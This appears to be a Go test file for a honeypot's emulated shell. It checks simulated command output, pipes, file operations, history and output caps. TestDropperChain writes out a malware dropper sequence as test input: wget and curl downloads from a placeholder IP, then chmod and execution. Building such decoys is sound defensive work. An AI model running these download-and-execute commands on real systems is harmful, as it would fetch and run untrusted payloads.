package shell

import (
	"strings"
	"testing"
)

func run(t *testing.T, s *Shell, line string) string {
	t.Helper()
	return s.Exec(line).Output
}

func TestBasicCommands(t *testing.T) {
	s := New("srv-prod-01", "root")
	cases := []struct{ line, want string }{
		{"whoami", "root\n"},
		{"pwd", "/root\n"},
		{"id", "uid=0(root) gid=0(root) groups=0(root)\n"},
		{"uname", "Linux\n"},
		{"uname -m", "x86_64\n"},
		{"uname -s -r", "Linux 5.15.0-105-generic\n"},
		{"echo hello   world", "hello world\n"},
		{`echo "a  b" 'c'`, "a  b c\n"},
		{"echo -n x", "x"},
		{"echo $HOME $USER", "/root root\n"},
		{"nproc", "4\n"},
		{"foo", "-bash: foo: command not found\n"},
		{"python3 -c 'print(1)'", "-bash: python3: command not found\n"},
		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
		{"busybox cat /etc/hostname", "srv-prod-01\n"},
		{"sudo whoami", "root\n"},
		{"sh -c 'echo nested'", "nested\n"},
	}
	for _, c := range cases {
		if got := run(t, s, c.line); got != c.want {
			t.Errorf("%q: got %q, want %q", c.line, got, c.want)
		}
	}
}

func TestPipesAndLists(t *testing.T) {
	s := New("h", "root")
	if got := run(t, s, "cat /proc/cpuinfo | grep 'model name' | wc -l"); got != "4\n" {
		t.Errorf("cpu count pipeline: %q", got)
	}
	if got := run(t, s, "cat /proc/cpuinfo | grep -c processor"); got != "4\n" {
		t.Errorf("grep -c: %q", got)
	}
	if got := run(t, s, "false && echo no; true && echo yes || echo never"); got != "yes\n" {
		t.Errorf("lists: %q", got)
	}
	if got := run(t, s, "cd /nope || echo fallback"); !strings.HasSuffix(got, "fallback\n") {
		t.Errorf("|| fallback: %q", got)
	}
	if got := run(t, s, "echo $?"); got != "0\n" {
		t.Errorf("status: %q", got)
	}
	if got := run(t, s, "cat /etc/passwd | head -n 1"); got != "root:x:0:0:root:/root:/bin/bash\n" {
		t.Errorf("head: %q", got)
	}
}

func TestFilesystem(t *testing.T) {
	s := New("h", "root")
	run(t, s, "cd /tmp")
	if got := run(t, s, "pwd"); got != "/tmp\n" {
		t.Fatalf("cd: %q", got)
	}
	run(t, s, "echo first > a.txt; echo second >> a.txt")
	if got := run(t, s, "cat /tmp/a.txt"); got != "first\nsecond\n" {
		t.Errorf("redirect: %q", got)
	}
	run(t, s, "mkdir -p x/y/z && touch x/y/z/f")
	if got := run(t, s, "ls x/y/z"); got != "f\n" {
		t.Errorf("mkdir -p: %q", got)
	}
	run(t, s, "rm -rf x")
	if got := run(t, s, "ls x"); !strings.Contains(got, "No such file") {
		t.Errorf("rm -rf: %q", got)
	}
	if got := run(t, s, "cd ~ && pwd"); got != "/root\n" {
		t.Errorf("cd ~: %q", got)
	}
	if s.Prompt() != "root@h:~# " {
		t.Errorf("prompt: %q", s.Prompt())
	}
}

func TestDropperChain(t *testing.T) {
	// The classic "download, chmod, run" sequence must play along without executing anything.
	s := New("h", "root")
	out := run(t, s, "cd /tmp; wget http://203.0.113.9/bins/x86; chmod +x x86; ./x86")
	if !strings.Contains(out, "'x86' saved") {
		t.Errorf("wget output: %q", out)
	}
	if !strings.HasSuffix(out, "Segmentation fault (core dumped)\n") {
		t.Errorf("exec output: %q", out)
	}
	if got := run(t, s, "./missing"); !strings.Contains(got, "No such file") {
		t.Errorf("missing binary: %q", got)
	}
	run(t, s, "curl -o run.sh http://203.0.113.9/run.sh")
	if got := run(t, s, "./run.sh"); !strings.Contains(got, "Permission denied") {
		t.Errorf("not executable: %q", got)
	}
}

func TestScriptViaPipe(t *testing.T) {
	s := New("h", "root")
	run(t, s, "echo 'echo from-script' > /tmp/s.sh")
	if got := run(t, s, "cat /tmp/s.sh | sh"); got != "from-script\n" {
		t.Errorf("pipe to sh: %q", got)
	}
}

func TestExitAndHistory(t *testing.T) {
	s := New("h", "ubuntu")
	run(t, s, "ls")
	run(t, s, "uname -a")
	if got := run(t, s, "history"); !strings.Contains(got, "    2  uname -a") {
		t.Errorf("history: %q", got)
	}
	if res := s.Exec("whoami; exit"); !res.Exit || !strings.HasPrefix(res.Output, "ubuntu\n") {
		t.Errorf("exit: %+v", res)
	}
	if s.Prompt() != "ubuntu@h:~$ " {
		t.Errorf("user prompt: %q", s.Prompt())
	}
}

func TestLimits(t *testing.T) {
	s := New("h", "root")
	// A fork-bomb-ish line must terminate and stay bounded.
	line := strings.Repeat("cat /proc/cpuinfo; ", 500)
	if out := run(t, s, line); len(out) > maxOutput {
		t.Errorf("output not capped: %d bytes", len(out))
	}
	// Recursive sh -c must stop at maxDepth.
	run(t, s, `echo 'sh /tmp/r.sh' > /tmp/r.sh`)
	run(t, s, "sh /tmp/r.sh")
}

func TestTokenizer(t *testing.T) {
	env := func(k string) string { return map[string]string{"X": "1"}[k] }
	p := parse(`a "b c" d\ e $X '$X' "${X}y" > out 2>/dev/null | f && g`, env)
	if len(p) != 2 {
		t.Fatalf("pipelines: %d", len(p))
	}
	got := p[0].cmds[0]
	want := []string{"a", "b c", "d e", "1", "$X", "1y"}
	if strings.Join(got.args, "|") != strings.Join(want, "|") || got.redirect != "out" {
		t.Errorf("tokens: %q redirect=%q", got.args, got.redirect)
	}
	if len(p[0].cmds) != 2 || p[1].op != "&&" {
		t.Errorf("structure: %+v", p)
	}
}
